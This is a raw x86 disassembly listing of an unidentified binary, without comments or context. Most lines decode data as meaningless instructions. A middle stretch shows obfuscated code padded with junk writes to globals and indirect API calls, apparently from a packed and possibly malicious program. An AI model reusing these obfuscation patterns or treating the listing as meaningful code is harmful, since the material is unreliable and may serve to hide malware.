  417286:	ins    BYTE PTR es:[edi],dx
  417287:	ror    BYTE PTR [ecx-0x55ad0c4b],0x17
  41728e:	aad    0x64
  417290:	jecxz  0x4172d1
  417292:	out    0xe,eax
  417294:	push   ecx
  417295:	pushf  
  417296:	lods   eax,DWORD PTR ds:[esi]
  417297:	sbb    ebp,DWORD PTR [edi]
  417299:	aad    0xc7
  41729b:	into   
  41729c:	adc    eax,0x70e07145
  4172a1:	pop    edx
  4172a2:	ficom  WORD PTR [edi]
  4172a4:	pushf  
  4172a5:	out    dx,eax
  4172a6:	mov    ebx,0xa3649c42
  4172ab:	mov    WORD PTR [ebx-0xa],ss
  4172ae:	and    cl,BYTE PTR [eax]
  4172b0:	fistp  WORD PTR [edi]
  4172b2:	icebp  
  4172b3:	jno    0x41726b
  4172b5:	or     dh,bl
  4172b7:	jecxz  0x41726f
  4172b9:	dec    ebx
  4172ba:	dec    ebp
  4172bb:	rcl    BYTE PTR [eax-0x3d],cl
  4172be:	pop    edx
  4172bf:	js     0x417309
  4172c1:	push   0x76
  4172c3:	mov    dl,0xa
  4172c5:	in     eax,0x1
  4172c7:	sub    al,0xd3
  4172c9:	retf   
  4172ca:	pop    edi
  4172cb:	dec    edx
  4172cc:	(bad)  
  4172cd:	popf   
  4172ce:	push   0xf48f3514
  4172d3:	fdivrp st(3),st
  4172d5:	pop    ds
  4172d6:	in     al,0xfe
  4172d8:	cs out 0xb1,al
  4172db:	xchg   ebp,eax
  4172dc:	test   bh,ah
  4172de:	ja     0x41728e
  4172e0:	and    ch,BYTE PTR [edi-0x62fe1928]
  4172e6:	rol    DWORD PTR [edx+eax*8-0x71ecbbfa],cl
  4172ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172ee:	shr    BYTE PTR [edi+0x104f6e89],1
  4172f4:	cmp    BYTE PTR [esi],0x82
  4172f7:	rcl    al,0xac
  4172fa:	xchg   edx,eax
  4172fb:	lds    eax,FWORD PTR [ebp+0x59]
  4172fe:	cld    
  4172ff:	cs dec ecx
  417301:	shl    BYTE PTR [ebx+0x2c],1
  417304:	or     DWORD PTR [ecx-0x1e],esp
  417307:	fst    QWORD PTR [ebx-0x10617028]
  41730d:	inc    edi
  41730e:	mov    al,BYTE PTR [ebp-0x5e99c72c]
  417314:	call   0x626c1375
  417319:	test   esp,esi
  41731b:	dec    edx
  41731c:	loopne 0x417332
  41731e:	(bad)  
  41731f:	jge    0x4172c0
  417321:	xchg   DWORD PTR [edi+0x1b],edi
  417324:	mov    ecx,0x95dce910
  417329:	pop    ebx
  41732a:	xor    cl,cl
  41732c:	mov    eax,0x51b7e04a
  417331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417332:	xchg   BYTE PTR [ebx-0x7],bl
  417335:	push   ds
  417336:	push   es
  417337:	fcomp  DWORD PTR [edx-0x72c785b3]
  41733d:	lds    edi,FWORD PTR [ecx+0x3e]
  417340:	mov    dh,cl
  417342:	push   edi
  417343:	pop    ecx
  417344:	jecxz  0x41731c
  417346:	dec    esp
  417347:	ret    0x5aa1
  41734a:	jno    0x417369
  41734c:	ret    0x98ef
  41734f:	lea    eax,[esp+0x44]
  417353:	mov    DWORD PTR [esp+0xc],eax
  417357:	cmp    DWORD PTR ds:0x42831d,0x0
  41735e:	mov    DWORD PTR ds:0x428461,edi
  417364:	mov    ecx,0x653d
  417369:	jmp    0x417446
  41736e:	mov    DWORD PTR ds:0x428405,0x6fab
  417378:	mov    DWORD PTR ds:0x4283f9,0x3325
  417382:	cmp    DWORD PTR ds:0x42831d,0x0
  417389:	jl     0x4173a7
  41738f:	push   DWORD PTR [ebp-0x20]
  417392:	push   DWORD PTR [ebp-0xc]
  417395:	call   DWORD PTR ds:0x42e0ec
  41739b:	xor    edi,0x628b
  4173a1:	or     edi,0x2ad9
  4173a7:	and    DWORD PTR ds:0x42854d,edx
  4173ad:	and    ecx,DWORD PTR ds:0x428569
  4173b3:	xor    edi,edi
  4173b5:	add    edi,DWORD PTR ds:0x42849d
  4173bb:	mov    edx,DWORD PTR ds:0x428595
  4173c1:	sub    edi,edx
  4173c3:	or     edi,DWORD PTR [edi+edx*1]
  4173c6:	inc    edx
  4173c7:	cmp    DWORD PTR ds:0x428345,0x0
  4173ce:	mov    DWORD PTR ds:0x428469,0x322b
  4173d8:	mov    DWORD PTR ds:0x428365,0x622c
  4173e2:	mov    edx,DWORD PTR ds:0x428335
  4173e8:	mov    DWORD PTR ds:0x4284bd,0x673b
  4173f2:	jmp    0x417446
  4173f7:	mov    DWORD PTR ds:0x42833d,edx
  4173fd:	cmp    DWORD PTR ds:0x428345,0x0
  417404:	jl     0x41742c
  41740a:	push   DWORD PTR [ebp-0x24]
  41740d:	push   0x428233
  417412:	call   DWORD PTR ds:0x42e27c
  417418:	sbb    DWORD PTR ds:0x428341,0x4806
  417422:	add    DWORD PTR ds:0x4284d1,0x48d6
  41742c:	add    edi,0x263
  417432:	xor    DWORD PTR ds:0x428349,0x2f2b
  41743c:	add    DWORD PTR ds:0x428571,0x7768
  417446:	lea    eax,[esp+0x60]
  41744a:	xor    ecx,ecx
  41744c:	or     ecx,DWORD PTR ds:0x42832d
  417452:	xor    DWORD PTR ds:0x428349,ecx
  417458:	mov    DWORD PTR [esp+0x10],eax
  41745c:	sub    edi,DWORD PTR ds:0x4284ed
  417462:	mov    eax,ds:0x4226f8
  417467:	sbb    DWORD PTR ds:0x428469,edx
  41746d:	mov    eax,DWORD PTR [eax+0x1d8]
  417473:	cmp    DWORD PTR ds:0x42846d,0x0
  41747a:	mov    edi,0x142d
  41747f:	mov    DWORD PTR ds:0x42835d,edi
  417485:	jmp    0x4174dd
  41748a:	not    ecx
  41748c:	cmp    DWORD PTR ds:0x42846d,0x0
  417493:	jg     0x4174bb
  417499:	push   DWORD PTR [ebp-0x1c]
  41749c:	push   0x483b
  4174a1:	call   DWORD PTR ds:0x42e0f0
  4174a7:	and    DWORD PTR ds:0x4284dd,0x19ab
  4174b1:	xor    DWORD PTR ds:0x428331,0x742c
  4174bb:	add    edx,DWORD PTR ds:0x428549
  4174c1:	sub    DWORD PTR ds:0x428459,0x7d91
  4174cb:	mov    edx,DWORD PTR ds:0x42840d
  4174d1:	or     DWORD PTR ds:0x4284d5,edx
  4174d7:	adc    DWORD PTR ds:0x4284e1,ecx
  4174dd:	mov    eax,DWORD PTR [eax]
  4174df:	mov    edi,DWORD PTR ds:0x428505
  4174e5:	mov    ecx,DWORD PTR ds:0x428581
  4174eb:	sub    ecx,edi
  4174ed:	or     edi,DWORD PTR [edi+ecx*1]
  4174f0:	mov    ecx,eax
  4174f2:	xor    ecx,0xa5069baf
  4174f8:	xor    edx,edx
  4174fa:	or     edx,DWORD PTR ds:0x428439
  417500:	sub    edx,DWORD PTR ds:0x42845d
  417506:	mov    DWORD PTR ds:0x428439,edx
  41750c:	xor    eax,0xfffffffe
  41750f:	shl    eax,0x1e
  417512:	and    DWORD PTR ds:0x428329,edi
  417518:	shr    ecx,0x2
  41751b:	or     ecx,eax
  41751d:	mov    eax,DWORD PTR [esp+0x10]
  417521:	inc    edx
  417522:	mov    DWORD PTR [eax],ecx
  417524:	xor    edx,edi
  417526:	mov    edi,0xcb79b566
  41752b:	mov    DWORD PTR [esp+0x80],edi
  417532:	mov    DWORD PTR [esp+0x84],esi
  417539:	cmp    DWORD PTR ds:0x428405,0x0
  417540:	movzx  ecx,WORD PTR ds:0x428335
  417547:	movzx  ecx,BYTE PTR ds:0x428429
  41754e:	jmp    0x4175bc
  417553:	not    edx
  417555:	cmp    DWORD PTR ds:0x428405,0x0
  41755c:	jb     0x4175ae
  417562:	push   DWORD PTR [ebp-0x20]
  417565:	push   0x1e74
  41756a:	push   0x10b8
  41756f:	push   0x6d55
  417574:	push   DWORD PTR [ebp-0x18]
  417577:	push   DWORD PTR [ebp-0x1c]
  41757a:	call   DWORD PTR ds:0x42e0f4
  417580:	movzx  edx,BYTE PTR ds:0x428571
  417587:	add    edx,DWORD PTR ds:0x4284d9
  41758d:	mov    DWORD PTR ds:0x428571,edx
  417593:	xor    ecx,ecx
  417595:	xor    ecx,DWORD PTR ds:0x4283a9
  41759b:	xor    edx,edx
  41759d:	xor    edx,DWORD PTR ds:0x428521
  4175a3:	sub    ecx,edx
  4175a5:	sub    ecx,DWORD PTR [ecx+edx*1]
  4175a8:	add    DWORD PTR ds:0x42835d,edx
  4175ae:	xor    DWORD PTR ds:0x428559,ebx
  4175b4:	sbb    DWORD PTR ds:0x4283f5,edx
  4175ba:	adc    edx,ecx
  4175bc:	mov    eax,DWORD PTR [esp+0x80]
  4175c3:	or     edx,edx
  4175c5:	mov    ecx,DWORD PTR [esp+0x84]
  4175cc:	cmp    DWORD PTR ds:0x428469,0x0
  4175d3:	mov    edx,DWORD PTR ds:0x42846d
  4175d9:	mov    DWORD PTR ds:0x428339,0x64c4
  4175e3:	mov    edx,DWORD PTR ds:0x4283fd
  4175e9:	jmp    0x417644
  4175ee:	mov    DWORD PTR ds:0x428421,0x1a08
  4175f8:	cmp    DWORD PTR ds:0x428469,0x0
  4175ff:	ja     0x417624
  417605:	push   DWORD PTR [ebp-0x1c]
  417608:	call   DWORD PTR ds:0x42e280
  41760e:	sbb    edx,DWORD PTR ds:0x428341
  417614:	adc    DWORD PTR ds:0x42840d,0x1011
  41761e:	sbb    DWORD PTR ds:0x4284c5,ebx
  417624:	xor    edx,edx
  417626:	or     edx,DWORD PTR ds:0x4283f5
  41762c:	xor    DWORD PTR ds:0x42853d,edx
  417632:	add    DWORD PTR ds:0x4283fd,ebx
  417638:	add    edx,0x156e
  41763e:	sub    edx,0x437f
  417644:	shrd   eax,ecx,0x2
  417648:	cmp    DWORD PTR ds:0x4284f1,0x0
  41764f:	mov    edx,0x364f
  417654:	mov    DWORD PTR ds:0x4284e5,0x205c
  41765e:	mov    edx,0xb6f
  417663:	jmp    0x4176bb
  417668:	mov    edx,DWORD PTR ds:0x428535
  41766e:	mov    DWORD PTR ds:0x428361,edi
  417674:	cmp    DWORD PTR ds:0x4284f1,0x0
  41767b:	jae    0x4176a7
  417681:	push   DWORD PTR [ebp-0x18]
  417684:	call   DWORD PTR ds:0x42e0f8
  41768a:	sub    DWORD PTR ds:0x428439,0x4a16
  417694:	mov    edx,DWORD PTR ds:0x428571
  41769a:	or     DWORD PTR ds:0x428555,edx
  4176a0:	sub    DWORD PTR ds:0x42853d,ecx
  4176a6:	dec    edx
  4176a7:	dec    edx
  4176a8:	not    DWORD PTR ds:0x428321
  4176ae:	movzx  edx,WORD PTR ds:0x428535
  4176b5:	sub    DWORD PTR ds:0x4284ed,edx
  4176bb:	shr    ecx,0x2
  4176be:	mov    ecx,DWORD PTR [esp+0x80]
  4176c5:	mov    edx,DWORD PTR [esp+0x84]
  4176cc:	add    DWORD PTR ds:0x428325,0x428351
  4176d6:	xor    eax,0x32de6d5d
  4176db:	adc    DWORD PTR ds:0x428355,0x4c3b
  4176e5:	xor    edx,edx
  4176e7:	or     DWORD PTR ds:0x4284cd,0x428341
  4176f1:	or     edx,eax
  4176f3:	mov    eax,ds:0x428455
  4176f8:	adc    DWORD PTR ds:0x428561,eax
  4176fe:	mov    eax,ds:0x4226f8
  417703:	or     DWORD PTR ds:0x4283fd,0x428431
  41770d:	push   edx
  41770e:	or     DWORD PTR ds:0x428415,0x3421
  417718:	push   DWORD PTR [eax+0x19c]
  41771e:	lea    eax,[esp+0x80]
  417725:	push   eax
  417726:	sbb    DWORD PTR ds:0x428341,0x428455
  417730:	shl    ecx,0x1e
  417733:	call   0x411c08
  417738:	or     DWORD PTR ds:0x4283fd,0x889
  417742:	lea    eax,[ebp+0x10]
  417745:	add    DWORD PTR ds:0x428425,0x428361
  41774f:	push   eax
  417750:	or     DWORD PTR ds:0x428401,0x378
  41775a:	mov    DWORD PTR [esp+0x14],edi
  41775e:	mov    DWORD PTR [esp+0x18],esi
  417762:	add    DWORD PTR ds:0x42855d,0x1c44
  41776c:	lea    eax,[ebp+0xc]
  41776f:	sbb    DWORD PTR ds:0x428555,0x6a60
  417779:	push   eax
  41777a:	adc    DWORD PTR ds:0x428471,0x65f7
  417784:	mov    DWORD PTR [esp+0x18],edi
  417788:	lea    eax,[ebp+0x8]
  41778b:	mov    DWORD PTR [esp+0x1c],esi
  41778f:	sub    DWORD PTR ds:0x428469,0x37c8
  417799:	jmp    0x4179f6
  41779e:	cmp    edx,eax
  4177a0:	retf   
  4177a1:	mov    esp,0x44b9bc3c
  4177a6:	out    0x8d,eax
  4177a8:	push   es
  4177a9:	xchg   edx,eax
  4177aa:	sbb    dh,bh
  4177ac:	push   ss
  4177ad:	sar    ebx,1
  4177af:	faddp  st(0),st
  4177b1:	mov    esi,0xbebec235
  4177b6:	out    0x90,al
  4177b8:	sub    bl,bl
  4177ba:	out    dx,eax
  4177bb:	jnp    0x4177d6
  4177bd:	pand   mm0,QWORD PTR [ebp-0x7c]
  4177c1:	mov    edi,0xedfb20a9
  4177c6:	sub    al,0x7f
  4177c8:	gs push esi
  4177ca:	aad    0x5b
  4177cc:	icebp  
  4177cd:	adc    eax,0xf5fad16b
  4177d2:	lea    esp,[ebx+esi*4-0x4e903b58]
  4177d9:	push   ecx
  4177da:	enter  0xeb6b,0x7d
  4177de:	mov    al,0x19
  4177e0:	mov    WORD PTR [eax-0x20],ss
  4177e3:	or     BYTE PTR [edx-0x3f],0xe6
  4177e7:	mov    dh,0x4e
  4177e9:	lahf   
  4177ea:	test   BYTE PTR [esi+0x51ffe0c2],bl
  4177f0:	push   ebp
  4177f1:	mov    cl,0x5e
  4177f3:	pusha  
  4177f4:	jmp    0xeb7b:0xfafecf9d
  4177fb:	es repz sahf 
  4177fe:	fnstenv [esp+edi*8+0x78]
  417802:	xchg   cl,dh
  417804:	inc    ebp
  417805:	lods   eax,DWORD PTR ds:[esi]
  417806:	rol    cl,0x34
  417809:	lods   eax,DWORD PTR ds:[esi]
  41780a:	pusha  
  41780b:	out    dx,eax
  41780c:	mov    edi,0x8fec0004
  417811:	and    edi,0xffffffb5
  417814:	push   edi
  417815:	je     0x417882
  417817:	nop
  417818:	sub    DWORD PTR [ecx],0xdc221f67
  41781e:	dec    ebx
  41781f:	xlat   BYTE PTR ds:[ebx]
  417820:	aam    0x96
  417822:	lods   eax,DWORD PTR ds:[esi]
  417823:	jecxz  0x417809
  417825:	push   0x6d6cd461
  41782a:	mov    ebp,DWORD PTR [eax+eiz*1+0x66]
  41782e:	mov    dl,0x5b
  417830:	jle    0x41785f
  417832:	stos   BYTE PTR es:[edi],al
  417833:	mov    bh,0xd5
  417835:	xor    cl,al
  417837:	scas   al,BYTE PTR es:[edi]
  417838:	pushf  
  417839:	or     esi,ebx
  41783b:	ficomp DWORD PTR [ebx+0x2e]
  41783e:	pop    es
  41783f:	std    
  417840:	mov    al,0xf6
  417842:	adc    esp,DWORD PTR ds:0x39ed1627
  417848:	push   es
  417849:	(bad)  
  41784a:	jecxz  0x417852
  41784c:	(bad)  
  41784d:	jae    0x417807
  41784f:	(bad)  
  417850:	nop
  417851:	xor    esi,DWORD PTR [edi+eiz*1-0x2bae34f1]
  417858:	out    0x7e,eax
  41785a:	ins    BYTE PTR es:[edi],dx
  41785b:	adc    BYTE PTR [ebx],bl
  41785d:	cld    
  41785e:	(bad)  
  41785f:	pop    ecx
  417860:	mov    eax,ds:0xeace0935
  417865:	test   DWORD PTR [esi],eax
  417867:	cwde   
  417868:	adc    edx,DWORD PTR [esi+0x17]
  41786b:	inc    edx
  41786c:	lods   eax,DWORD PTR ds:[esi]
  41786d:	rol    BYTE PTR [eax+0x8813ecc],1
  417873:	dec    ebx
  417874:	loopne 0x41784f
  417876:	jo     0x417813
  417878:	mov    esi,0x2c2ce145
  41787d:	or     eax,0xf4d3a66e
  417882:	sub    al,0xfd
  417884:	mov    edx,0x77170914
  417889:	mov    ah,0xe9
  41788b:	cwde   
  41788c:	jl     0x4178e7
  41788e:	mov    WORD PTR [eax-0x15a8f61a],fs
  417894:	pop    es
  417895:	sub    al,0x77
  417897:	push   esi
  417898:	mov    al,BYTE PTR [edi+0x188ddfae]
  41789e:	mov    ebp,0x4708da9d
  4178a3:	xchg   ecx,eax
  4178a4:	adc    esi,ecx
  4178a6:	cmpxchg DWORD PTR [edx],esi
  4178a9:	ja     0x41789c
  4178ab:	shr    DWORD PTR [edx],cl
  4178ad:	sub    esp,DWORD PTR [edx+0x5f]
  4178b0:	enter  0x9d4c,0x47
  4178b4:	jle    0x417911
  4178b6:	and    DWORD PTR [ebp+0x78dc61cc],eax
  4178bc:	pushf  
  4178bd:	or     DWORD PTR [edx+0x8b08f67],esp
  4178c3:	pop    ebp
  4178c4:	cmp    eax,0x7355dd6
  4178c9:	sub    BYTE PTR [edi-0x1287b301],dl
  4178cf:	push   0x2cb8f61a
  4178d4:	mov    edi,0xdf0522fa
  4178d9:	mov    ah,BYTE PTR [ebx-0x3e]
  4178dc:	xchg   bh,ah
  4178de:	call   0xc6e63894
  4178e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178e4:	dec    esp
  4178e5:	es ja  0x417879
  4178e8:	pop    esp
  4178e9:	fnstenv [edx-0x59]
  4178ec:	xor    eax,0x1cae730b
  4178f1:	fs pop eax
  4178f3:	hlt    
  4178f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178f5:	jmp    0x350313e0
  4178fa:	fnstcw WORD PTR [edx+edx*2+0x19]
  4178fe:	ins    DWORD PTR es:[edi],dx
  4178ff:	stc    
  417900:	xchg   edi,eax
  417901:	mov    BYTE PTR [esi+0x1c],ch
  417904:	mov    fs,WORD PTR [eax-0x18e4376]
  41790a:	mov    ebx,0x10151d7c
  41790f:	scas   eax,DWORD PTR es:[edi]
  417910:	test   eax,0x3d89d3a6
  417915:	jl     0x417981
  417917:	ret    0x7640
  41791a:	pop    ds
  41791b:	ret    0x7a2d
  41791e:	mov    ss,ecx
  417920:	shl    ebp,cl
  417922:	jp     0x41793a
  417924:	ins    BYTE PTR es:[edi],dx
  417925:	xchg   edi,eax
  417926:	into   
  417927:	push   esi
  417928:	adc    DWORD PTR [esi],ecx
  41792a:	jmp    0x4178d6
  41792c:	shr    bl,0x78
  41792f:	mov    es,WORD PTR [ecx+esi*1-0x16]
  417933:	add    DWORD PTR [eax+0x35c4863f],edi
  417939:	dec    ebp
  41793a:	adc    edi,ecx
  41793c:	int3   
  41793d:	inc    ebp
  41793e:	and    BYTE PTR [ecx+0x168e1308],bh
  417944:	pop    esp
  417945:	aas    
  417946:	mov    cl,0x36
  417948:	lds    edx,FWORD PTR [ebp-0x60]
  41794b:	pop    DWORD PTR [eax+0xa]
  41794e:	das    
  41794f:	xchg   ecx,eax
  417950:	hlt    
  417951:	push   0x37
  417953:	dec    edx
  417954:	mov    ds:0xfe83061b,al
  417959:	int3   
  41795a:	aam    0x10
  41795c:	cs pop ds
  41795e:	fstp   TBYTE PTR [ecx+0x40]
  417961:	outs   dx,DWORD PTR ds:[esi]
  417962:	lahf   
  417963:	dec    esp
  417964:	mov    eax,0x95899d3b
  417969:	ds xchg ebx,eax
  41796b:	inc    ecx
  41796c:	enter  0x45ed,0xef
  417970:	xor    ebp,DWORD PTR [eax+0x40]
  417973:	cmp    eax,DWORD PTR [edi-0x3b8df4be]
  417979:	out    0xb7,al
  41797b:	dec    esi
  41797c:	test   BYTE PTR [edi+0x52],bl
  41797f:	mov    esp,0xef344fdd
  417984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417985:	xor    BYTE PTR [esi-0x60],dh
  417988:	nop
  417989:	inc    ecx
  41798a:	outs   dx,BYTE PTR ds:[esi]
  41798b:	jns    0x4179a2
  41798d:	pop    ebp
  41798e:	stos   BYTE PTR es:[edi],al
  41798f:	and    edi,DWORD PTR [eax-0x288c8ba4]
  417995:	jmp    0x6c25f7fa
  41799a:	or     DWORD PTR [ecx-0x5b],0x3b
  41799e:	nop
  41799f:	addr16 mov esi,eax
  4179a2:	pop    edi
  4179a3:	out    dx,al
  4179a4:	popa   
  4179a5:	or     eax,0xdf2d1911
  4179aa:	inc    ebx
  4179ab:	mov    al,0xcd
  4179ad:	data16 mov bl,al
  4179b0:	adc    BYTE PTR [ecx-0x64],dl
  4179b3:	pop    esp
  4179b4:	or     eax,0xf06f8fe2
  4179b9:	xor    eax,0xea296b45
  4179be:	(bad)  
  4179bf:	imul   ebp,DWORD PTR [edi+0x31],0xd925b5e2
  4179c6:	out    0x1a,eax
  4179c8:	cmp    dh,cl
  4179ca:	(bad)  
  4179cb:	adc    BYTE PTR [ecx+ebx*2+0x60dcb8b6],dh
  4179d2:	frstor [ebx+esi*8-0x8]
  4179d6:	cmp    edx,ebx
  4179d8:	sub    ah,BYTE PTR [ecx+0x7a]
  4179db:	jb     0x4179bd
  4179dd:	jp     0x417a4c
  4179df:	xchg   ecx,eax
  4179e0:	push   ebx
  4179e1:	adc    DWORD PTR [eax-0x35226059],0xa66c8b86
  4179eb:	call   0xc3086e10
  4179f0:	xor    eax,0x6b06cd93
  4179f5:	fmul   DWORD PTR [ecx-0x7ee7db84]
  4179fb:	adc    eax,0x4284c9
  417a00:	pop    ebp
  417a01:	add    DWORD PTR [edx+0x0],0xffffffe9
  417a05:	pop    eax
  417a06:	add    al,BYTE PTR [eax]
  417a08:	add    BYTE PTR [eax],ah
  417a0a:	add    ebp,ebx
  417a0c:	xchg   ecx,eax
  417a0d:	jecxz  0x4179c1
  417a0f:	mov    ah,0xb4
  417a11:	jb     0x417a54
  417a13:	sahf   
  417a14:	nop
  417a15:	jl     0x4179e6
  417a17:	fs sahf 
  417a19:	jae    0x4179fd
  417a1b:	sar    BYTE PTR [esi-0x41413dcb],0x60
  417a22:	cs dec ebp
  417a24:	mov    DWORD PTR [ebx+eax*8+0x51a82f91],edi
  417a2b:	pop    edx
  417a2c:	jo     0x417a76
  417a2e:	sub    DWORD PTR [ebx+0x1f],0x164a4dd5
  417a35:	sub    ch,ch
  417a37:	sbb    al,0x81
  417a39:	xor    al,0xf3
  417a3b:	cs mov al,0xa9
  417a3e:	xchg   ecx,eax
  417a3f:	in     al,0x5b
  417a41:	and    eax,0x9a9b2504
  417a46:	in     eax,0x9
  417a48:	loopne 0x4179dd
  417a4a:	adc    al,0xc4
  417a4c:	shl    BYTE PTR [edx+0x5],cl
  417a4f:	mov    edi,0x7216fa8a
  417a54:	rol    BYTE PTR [esi+0x7492ec47],1
  417a5a:	lahf   
  417a5b:	std    
  417a5c:	call   FWORD PTR [eax+0x7d2fde16]
  417a62:	test   DWORD PTR [eax+esi*8+0x3],ebp
  417a66:	xchg   esp,eax
  417a67:	out    0x43,eax
  417a69:	stos   DWORD PTR es:[edi],eax
  417a6a:	mov    bh,0x72
  417a6c:	jo     0x4179f7
  417a6e:	data16 loope 0x417a85
  417a71:	add    al,0xd9
  417a73:	(bad)
  417a77:	jmp    0x417a0a
  417a79:	mov    bh,0xde
  417a7b:	aam    0x46
  417a7d:	add    dh,BYTE PTR ds:[ebx+0x33450ada]
  417a84:	jno    0x417ab3
  417a86:	and    eax,0xe0b83479
  417a8b:	retf   0x7ce
  417a8e:	mov    dh,0x61
  417a90:	(bad)  
  417a91:	mov    bl,0x9b
  417a93:	retf   
  417a94:	xor    DWORD PTR [ecx-0x2879fab7],esp
  417a9a:	aam    0x80
  417a9c:	push   ebx
  417a9d:	pop    eax
  417a9e:	jg     0x417af4
  417aa0:	jl     0x417ae9
  417aa2:	mov    edi,0xc6b41ca3
  417aa7:	nop
  417aa8:	es jbe 0x417a70
  417aab:	pop    esi
  417aac:	xor    esp,edx
  417aae:	call   0xde9b:0xf77286aa
  417ab5:	cmp    ch,BYTE PTR [esi]
  417ab7:	test   BYTE PTR [eax+eax*2+0x19],al
  417abb:	test   BYTE PTR [edi+0x7c198089],ah
  417ac1:	pop    edx
  417ac2:	hlt    
  417ac3:	scas   al,BYTE PTR es:[edi]
  417ac4:	cli    
  417ac5:	jns    0x417b11
  417ac7:	sahf   
  417ac8:	imul   ah
  417aca:	icebp  
  417acb:	jnp    0x417b2f
  417acd:	sti    
  417ace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417acf:	mov    ebx,0x89361e4f
  417ad4:	int3   
  417ad5:	ret    
  417ad6:	inc    edx
  417ad7:	add    ch,dl
  417ad9:	mov    BYTE PTR [esi+eiz*1+0x5d0a3b6e],dl
  417ae0:	(bad)  
  417ae1:	jle    0x417b55
  417ae3:	jecxz  0x417a9c
  417ae5:	mov    DWORD PTR [edi+edi*8-0xc5c6400],ebx
  417aec:	and    DWORD PTR [esi-0x2eb5212f],esi
  417af2:	out    0x3f,al
  417af4:	in     al,0x82
  417af6:	lods   al,BYTE PTR ds:[esi]
  417af7:	std    
  417af8:	cli    
  417af9:	and    DWORD PTR [edi-0x1e],ecx
  417afc:	or     al,0xf0
  417afe:	pop    eax
  417aff:	push   edi
  417b00:	pop    edx
  417b01:	and    DWORD PTR [edi-0x75],esi
  417b04:	test   ecx,eax
  417b06:	pop    ebp
  417b07:	mov    edx,0x57dbcb02
  417b0c:	add    DWORD PTR [esi-0x4973994e],0x3d7b6a04
  417b16:	fsubr  QWORD PTR [edx-0x7c]
  417b19:	sar    BYTE PTR [ecx+ebp*8-0x58b1e597],cl
  417b20:	jb     0x417b8e
  417b22:	xchg   ebx,eax
  417b23:	mov    bl,0x25
  417b25:	pop    ss
  417b26:	mov    ecx,0xc930bb16
  417b2b:	cli    
  417b2c:	sbb    bl,BYTE PTR [edx-0x13]
  417b2f:	mov    BYTE PTR [edx+0x4c001e0a],bh
  417b35:	cmp    bl,BYTE PTR [ecx+eiz*1-0x5d65fba6]
  417b3c:	out    0x3d,eax
  417b3e:	js     0x417b76
  417b40:	sbb    al,BYTE PTR [ebp-0x260758e1]
  417b46:	push   ebx
  417b47:	scas   eax,DWORD PTR es:[edi]
  417b48:	pop    esi
  417b49:	jecxz  0x417b9e
  417b4b:	in     eax,dx
  417b4c:	loopne 0x417b57
  417b4e:	jne    0x417b72
  417b50:	call   0xd919:0x55a81cb3
  417b57:	sub    dh,0x8b
  417b5a:	sbb    BYTE PTR [edi-0x37],0xe7
  417b5e:	bnd ret 0x5737
  417b62:	je     0x417b60
  417b64:	test   ah,ch
  417b66:	lahf   
  417b67:	push   0x2c
  417b69:	out    dx,eax
  417b6a:	adc    al,0x70
  417b6c:	sbb    al,0x73
  417b6e:	or     ebx,ecx
  417b70:	jns    0x417b18
  417b72:	mov    WORD PTR [edi-0x46],es
  417b75:	pop    es
  417b76:	pop    ss
  417b77:	adc    ebp,DWORD PTR [edx+ebx*8-0x158b549c]
  417b7e:	mov    ecx,0x559ebcb6
  417b83:	push   edi
  417b84:	mov    esi,0xb2ff5e6e
  417b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b8a:	jo     0x417b9d
  417b8c:	nop
  417b8d:	xchg   edx,eax
  417b8e:	das    
  417b8f:	jmp    0x6d0b8b63
  417b94:	add    BYTE PTR [esi],al
  417b96:	push   ebp
  417b97:	push   ebp
  417b98:	je     0x417bbe
  417b9a:	mov    eax,0xec8661e3
  417b9f:	sbb    ah,BYTE PTR [ebx-0x3a]
  417ba2:	sub    cl,dh
  417ba4:	mov    BYTE PTR [ecx],dh
  417ba6:	es dec esp
  417ba8:	xor    BYTE PTR ds:0x7748c954,dh
  417bae:	cmp    ebp,edi
  417bb0:	jb     0x417c0e
  417bb2:	add    DWORD PTR [edx-0xb],esi
  417bb5:	lock mov ds:0x5d77b6b6,al
  417bbb:	sti    
  417bbc:	pop    edi
  417bbd:	mov    al,ds:0x1df81975
  417bc2:	jae    0x417c0c
  417bc4:	xchg   edi,eax
  417bc5:	add    al,dl
  417bc7:	loope  0x417b9a
  417bc9:	pusha  
  417bca:	pop    esi
  417bcb:	mov    ebx,DWORD PTR [ebp-0x74]
  417bce:	in     al,dx
  417bcf:	test   ah,bh
  417bd1:	je     0x417c4e
  417bd3:	lods   al,BYTE PTR ds:[esi]
  417bd4:	bound  eax,QWORD PTR gs:[esi]
  417bd7:	adc    ebp,edi
  417bd9:	sar    BYTE PTR [ebp+0x3],0x7f
  417bdd:	or     ah,BYTE PTR [ebx+0x7894134f]
  417be3:	lds    esp,FWORD PTR [ebx]
  417be5:	jp     0x417bf0
  417be7:	jno    0x417c1f
  417be9:	outs   dx,BYTE PTR ds:[esi]
  417bea:	rol    dh,0xe8
  417bed:	mov    al,ds:0xf1c048f7
  417bf2:	push   cs
  417bf3:	push   cs
  417bf4:	gs pusha 
  417bf6:	push   edi
  417bf7:	into   
  417bf8:	icebp  
  417bf9:	lds    esi,FWORD PTR [ecx]
  417bfb:	fldlg2 
  417bfd:	pop    esp
  417bfe:	loop   0x417baa
  417c00:	xchg   ebp,eax
  417c01:	inc    ecx
  417c02:	or     DWORD PTR [eax],edx
  417c04:	cmp    al,0x61
  417c06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c07:	push   esi
  417c08:	push   ss
  417c09:	add    BYTE PTR [edx+0x71],dh
  417c0c:	stc    
  417c0d:	(bad)  
  417c0e:	out    0x56,eax
  417c10:	add    ecx,esp
  417c12:	jl     0x417c0f
  417c14:	inc    edx
  417c15:	xor    DWORD PTR [ecx-0x652e2ae5],esp
  417c1b:	xor    bl,cl
  417c1d:	(bad)  
  417c1e:	adc    eax,0x7e8e4dff
  417c23:	in     al,0x8c
  417c25:	retf   
  417c26:	scas   al,BYTE PTR es:[edi]
  417c27:	sbb    eax,0x7e58d4ca
  417c2c:	pop    ss
  417c2d:	dec    edi
  417c2e:	sub    eax,DWORD PTR [eax+0x60a71f7f]
  417c34:	popa   
  417c35:	scas   eax,DWORD PTR es:[edi]
